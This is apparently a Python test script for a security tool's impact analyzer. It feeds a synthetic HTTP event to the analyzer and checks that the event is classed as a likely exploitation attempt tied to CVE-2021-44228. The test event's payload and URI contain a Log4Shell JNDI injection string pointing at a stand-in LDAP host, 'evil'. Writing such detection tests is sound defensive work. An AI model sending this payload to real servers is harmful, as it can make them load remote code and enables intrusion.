from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.correlation.impact_analyzer import assess_impact
from src.event.models import HttpEvent


def main() -> None:
    event = HttpEvent(
        event_id="pkt-1",
        timestamp=1.0,
        src_ip="10.0.0.1",
        src_port=12345,
        dst_ip="10.0.0.2",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /?x=${jndi:ldap://evil/a} HTTP/1.1",
        summary="exploit",
        method="GET",
        uri="/?x=${jndi:ldap://evil/a}",
        host="victim",
        user_agent="demo",
        headers={},
    )
    impact = assess_impact(
        [event],
        [
            {
                "stage": "Exploitation",
                "confidence": "high",
                "evidence_ids": ["pkt-1"],
            }
        ],
        [],
        [{"cve": "CVE-2021-44228", "rule_confirmed": True, "final_score": 0.8}],
    )
    assert impact["verdict"] == "Likely exploitation attempt"
    assert "CVE-2021-44228" in impact["related_cves"]


if __name__ == "__main__":
    main()

